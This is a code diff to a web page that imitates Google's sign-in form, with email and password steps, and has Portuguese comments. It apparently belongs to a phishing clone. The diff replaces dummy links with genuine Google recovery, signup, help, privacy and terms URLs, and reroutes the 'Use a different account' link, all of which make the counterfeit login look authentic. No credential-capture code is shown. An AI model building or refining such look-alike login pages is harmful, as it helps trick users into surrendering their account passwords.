@@ -309,17 +309,17 @@ body {
                 <div class="input-container">
                     <input type="text" id="email-input" class="input-field" placeholder="Email or phone" autocomplete="username">
                 </div>
-                <a href="#" class="forgot-link">Forgot email?</a>
+                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="forgot-link">Forgot email?</a>
                 <p class="guest-mode-text">
                     Not your computer? Use Guest mode to sign in privately.
-                    <a href="#" class="learn-more-link">Learn more</a>
+                    <a href="https://support.google.com/accounts/answer/6090865" target="_blank" class="learn-more-link">Learn more</a>
                 </p>
             </div>
             
             <div id="password-step" class="form-step">
                 <div class="password-header">
                     <div class="email-display" id="email-display"></div>
-                    <a href="#" class="use-different-account" id="back-to-email">Use a different account</a>
+                    <a href="https://accounts.google.com/AccountChooser" target="_blank" class="use-different-account" id="back-to-email">Use a different account</a>
                 </div>
                 <div class="input-container">
                     <input type="password" id="password-input" class="input-field" placeholder="Enter your password" autocomplete="current-password">
@@ -330,11 +330,11 @@ body {
                         </label>
                     </div>
                 </div>
-                <a href="#" class="forgot-link">Forgot password?</a>
+                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="forgot-link">Forgot password?</a>
             </div>
             
             <div class="actions">
-                <a href="#" class="create-account-link">Create account</a>
+                <a href="https://accounts.google.com/signup" target="_blank" class="create-account-link">Create account</a>
                 <button id="next-button" class="next-button">Next</button>
             </div>
         </div>
@@ -349,9 +349,9 @@ body {
             </select>
         </div>
         <div class="footer-right">
-            <a href="#" class="footer-link">Help</a>
-            <a href="#" class="footer-link">Privacy</a>
-            <a href="#" class="footer-link">Terms</a>
+            <a href="https://support.google.com/accounts" target="_blank" class="footer-link">Help</a>
+            <a href="https://policies.google.com/privacy" target="_blank" class="footer-link">Privacy</a>
+            <a href="https://policies.google.com/terms" target="_blank" class="footer-link">Terms</a>
         </div>
     </footer>
     
@@ -431,10 +431,12 @@ function applyTranslations(lang) {
     document.querySelector('.subtitle').textContent = t.subtitle;
     document.getElementById('email-input').placeholder = t.emailPlaceholder;
     document.querySelector('.forgot-link').textContent = t.forgotEmail;
-    document.querySelector('.guest-mode-text').innerHTML = `${t.guestMode} <a href="#" class="learn-more-link">${t.learnMore}</a>`;
+    document.querySelector('.guest-mode-text').innerHTML = `${t.guestMode} <a href="https://support.google.com/accounts/answer/6090865" target="_blank" class="learn-more-link">${t.learnMore}</a>`;
     document.getElementById('password-input').placeholder = t.passwordPlaceholder;
     document.querySelector('.show-password span').textContent = t.showPassword;
-    document.querySelectorAll('.forgot-link')[1].textContent = t.forgotPassword;
+    if (document.querySelectorAll('.forgot-link')[1]) {
+        document.querySelectorAll('.forgot-link')[1].textContent = t.forgotPassword;
+    }
     document.getElementById('back-to-email').textContent = t.useDifferentAccount;
     document.querySelector('.create-account-link').textContent = t.createAccount;
     document.getElementById('next-button').textContent = t.next;
@@ -579,10 +581,13 @@ passwordInput.addEventListener('keypress', (e) => {
     }
 });
 
-// Voltar para email quando clicar em "Use a different account"
+// Voltar para email quando clicar em "Use a different account" (só se não tiver link)
 backToEmailLink.addEventListener('click', (e) => {
-    e.preventDefault();
-    goToEmailStep();
+    // Se o link não apontar para o Google, permitir comportamento padrão
+    if (!backToEmailLink.href.includes('google.com')) {
+        e.preventDefault();
+        goToEmailStep();
+    }
 });
 
 // Mostrar/ocultar senha
